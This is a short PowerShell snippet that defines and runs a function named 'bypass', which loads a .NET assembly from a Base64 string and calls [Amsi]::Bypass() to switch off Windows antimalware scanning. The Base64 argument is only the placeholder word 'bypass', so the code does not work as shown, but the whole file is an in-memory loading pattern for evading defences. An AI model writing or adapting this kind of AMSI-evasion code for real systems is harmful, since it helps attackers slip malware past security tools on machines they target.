function bypass{
    [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String("bypass"))
    [Amsi]::Bypass()
}
bypass